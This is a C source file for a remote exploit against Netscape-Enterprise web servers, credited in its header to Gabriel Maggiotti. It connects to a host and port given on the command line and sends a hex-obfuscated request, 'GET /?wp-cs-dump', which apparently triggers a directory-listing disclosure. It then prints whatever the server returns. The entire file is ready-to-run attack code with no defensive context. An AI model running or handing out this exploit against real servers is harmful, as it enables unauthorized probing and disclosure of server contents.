/*
 *	Server:Netscape-Enterprise
 *	This exploit is about Trasversal Vuln.
 *
 *	Written by Gabriel Maggiotti
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>

#define SEND	10000
#define RECIVE	100000


char *str_replace(char *rep, char *orig, char *string)
{
int len=strlen(orig);
char buf[SEND]="";
char *pt=strstr(string,orig);

strncpy(buf,string, pt-string );
strcat(buf,rep);
strcat(buf,pt+strlen(orig));
strcpy(string,buf);
return string;
}

/***************************************************************************/

int main(int argc,char *argv[])
{
int sockfd, numbytes;
char recv_buf[RECIVE];
int port;

char inject[SEND]=
	"\x47\x45\x54\x20\x2f\x3f\x77\x70\x2d\x63\x73\x2d"
	"\x64\x75\x6d\x70\x20\x48\x54\x54\x50\x2f\x31\x2e"
	"\x30\xa\xa";


struct hostent *he;

struct sockaddr_in their_addr;


if(argc!=3)
{
	fprintf(stderr,"usage:%s <hostname> <port>\n",argv[0]);
	exit(1);
}


if((he=gethostbyname(argv[1]))==NULL)
{
	perror("gethostbyname");
	exit(1);
}

port=atoi(argv[2]);



if( (sockfd=socket(AF_INET,SOCK_STREAM,0)) == -1)
{
	perror("socket");
	exit(1);
}


their_addr.sin_family=AF_INET;
their_addr.sin_port=htons(port);
their_addr.sin_addr=*((struct in_addr*)he->h_addr);
bzero(&(their_addr.sin_zero),8);



if( connect(sockfd,(struct sockaddr*)&their_addr, sizeof(struct sockaddr))==-1)
{
	perror("connect");
	exit(1);
}

if(send(sockfd,inject,SEND,0) ==-1)
{
	perror("send");
	exit(0);
}

if( (numbytes=recv(sockfd,recv_buf,RECIVE,0 )) == -1)
{
	perror("recv");
	exit(1);
}

recv_buf[numbytes]='\0';
printf("%s\n",recv_buf);




close(sockfd);

return 0;
}
